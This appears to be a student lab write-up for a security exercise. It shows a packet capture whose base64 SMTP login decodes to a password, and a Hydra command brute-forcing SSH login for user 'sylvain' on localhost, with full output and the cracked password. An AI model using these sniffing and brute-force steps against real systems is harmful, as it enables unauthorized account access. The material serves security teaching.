Attack is the best form of Defence
IN THIS PACKET::

:43:03.203661 IP 172.31.59.245.39998 > ec2-108-128-229-184.eu-west-1.compute.amazonaws.com.submission: Flags [P.], seq 63:85, ack 214, win 501, options [nop,nop,TS val 538428928 ecr 3150501365], length 22
        0x0000:  4510 004a 96d5 4000 4006 697b ac1f 3bf5  E..J..@.@.i{..;.
        0x0010:  6c80 e5b8 9c3e 024b 7266 e5c9 7f82 fa92  l....>.Krf......
        0x0020:  8018 01f5 3a8a 0000 0101 080a 2017 c600  ....:...........
        0x0030:  bbc8 d5f5 6258 6c77 5958 4e7a 6432 3979  ....bXlwYXNzd29y
        0x0040:  5a44 6b34 4f54 6768 0d0a                 ZDk4OTgh..
* TADA
* Data encode/decode: Base64 encoded string 'bXlwYXNzd29yZDk4OTghCg==', which decodes to 'mypassword9898!'




cyrus@Cyrus:~/alx-system_engineering-devops/attack_is_the_best_defense$ hydra -l sylvain -P 1000000-password-seclists.txt ssh://127.0.0.1:2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-29 23:03:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000000 login tries (l:1/p:1000000), ~62500 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[STATUS] 132.00 tries/min, 132 tries in 00:01h, 999870 to do in 126:15h, 16 active

[STATUS] 112.67 tries/min, 338 tries in 00:03h, 999664 to do in 147:53h, 16 active
[STATUS] 114.29 tries/min, 800 tries in 00:07h, 999202 to do in 145:44h, 16 active
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-29 23:13:15


Hecky syvain================> password123
